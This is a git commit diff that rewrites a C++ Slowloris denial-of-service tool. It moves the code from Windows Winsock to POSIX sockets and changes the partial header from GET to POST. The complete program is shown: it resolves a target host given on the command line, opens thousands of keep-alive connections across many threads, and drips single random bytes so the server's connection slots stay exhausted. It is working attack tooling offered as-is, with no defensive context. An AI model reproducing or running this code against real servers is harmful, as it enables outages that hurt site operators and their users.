c41ecf2aae12cf5b81331a871c1400b9f0f26f28
Adam <39814353+cherryaddict@users.noreply.github.com>
2022-05-20 11:57:10 +0100

    Update slowloris.cpp

--- slowloris.cpp
+++ slowloris.cpp
@@ -1,18 +1,20 @@
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
-
 #include <iostream>
-#include <thread>
-#include <winsock2.h>
-#include <vector>
 #include <string>
+#include <vector>
 #include <algorithm>
 #include <iterator>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <cstring>
+#include <chrono>
+#include <thread>
 
-#pragma comment(lib, "Ws2_32.lib")
-
+const int keep_alive = 1;
 int threads = 12;
 int connections = 2000;
+std::string port = "80";
 std::string url;
+sockaddr_in socket_address;
 
 class InputParser {
   public:
@@ -21,61 +23,60 @@ class InputParser {
     std::vector<std::string>::const_iterator itr;
     itr = std::find(this->tokens.begin(), this->tokens.end(), option);
     if (itr != this->tokens.end() && ++itr != this->tokens.end()) return *itr;
-    return std::string("");
+    return "";
   }
   bool arg_exists(const std::string& option) { return std::find(this->tokens.begin(), this->tokens.end(), option) != this->tokens.end(); }
   private:
     std::vector <std::string> tokens;
 };
 
-void slowloris(PVOID p) {
-  std::vector<SOCKET> sockets;
-  sockaddr_in* socket_address = (sockaddr_in*)p;
-  char header[] = "GET /";
+void slowloris () {
+  std::vector<int> sockets;
+  char header[] = "POST /";
   while (true) {
-    std::chrono::milliseconds timeout((rand() % 10000 + 1) + 1000);
+    std::chrono::milliseconds timeout(rand() % 10000 + 1);
     if (sockets.size() < connections) {
       for (int i = sockets.size(); i < connections; i++) {
-        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (s != INVALID_SOCKET) {
+        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (s >= 0) {
+          setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &keep_alive, sizeof(keep_alive));
+          connect(s, (sockaddr*)&socket_address, sizeof(sockaddr_in));
+          send(s, header, sizeof(header) - 1, 0);
           sockets.push_back(s);
-          connect(s, (sockaddr*)socket_address, sizeof(sockaddr_in));
-          send(s, header, sizeof(header) - 1, NULL);
         }
       }
     }
     for (int i = 0; i < sockets.size();) {
       char next_value = 'a' + rand() % 26;
-      int bytes_sent = send(sockets[i], &next_value, 1, NULL);
-      if (bytes_sent < 0) {
-        closesocket(sockets[i]);
-        sockets.erase(sockets.begin() + i);
-      }
+      int bytes_sent = send(sockets[i], &next_value, 1, 0);
+      if (bytes_sent < 0) sockets.erase(sockets.begin() + i);
       else i++;
     }
-    std::this_thread::sleep_for(timeout);
   }
 }
 
-int main(int argc, char* argv[]) {
+void init(int argc, char* argv[]) {
   srand(time(NULL));
-  WSADATA wsaData;
-  auto foo = WSAStartup(MAKEWORD(2, 2), &wsaData);
-  if (!foo) {
-    InputParser input(argc, argv);
-    if (input.arg_exists("-t")) threads = atoi(input.get_arg("-t").c_str());
-    if (input.arg_exists("-c")) connections = atoi(input.get_arg("-c").c_str());
-    if (input.arg_exists("-u")) url = input.get_arg("-u");
-    if (!url.rfind("http://", 0)) url = url.substr(7);
-    else if (!url.rfind("https://", 0)) url = url.substr(8);
-    hostent* host = gethostbyname(url.c_str());
-    sockaddr_in socket_address;
-    socket_address.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;
-    socket_address.sin_family = AF_INET;
-    if (input.arg_exists("-p")) socket_address.sin_port = htons(strtoul(input.get_arg("-p").c_str(), NULL, 0));
-    else socket_address.sin_port = htons(strtoul("80", NULL, 0));
-    std::vector<std::thread> thread_vector;
-    for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris, &socket_address));
-    for (std::thread& thread : thread_vector) if (thread.joinable()) thread.join();
-  }
+  InputParser input(argc, argv);
+  if (input.arg_exists("-p")) port = input.get_arg("-p");
+  if (input.arg_exists("-t")) threads = atoi(input.get_arg("-t").c_str());
+  if (input.arg_exists("-c")) connections = atoi(input.get_arg("-c").c_str());
+  if (input.arg_exists("-u")) url = input.get_arg("-u");
+  if (!url.rfind("http://", 0)) url = url.substr(7);
+  else if (!url.rfind("https://", 0)) url = url.substr(8);
+}
+
+void get_target_info() {
+  hostent* host = gethostbyname(url.c_str());
+  memcpy(&socket_address.sin_addr, host->h_addr, host->h_length);
+  socket_address.sin_family = AF_INET;
+  socket_address.sin_port = htons(strtoul(port.c_str(), NULL, 0));
+}
+
+int main (int argc, char* argv[]) {
+  init(argc, argv);
+  get_target_info();
+  std::vector<std::thread> thread_vector;
+  for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris));
+  for (std::thread& thread : thread_vector) if (thread.joinable()) thread.join();
 }
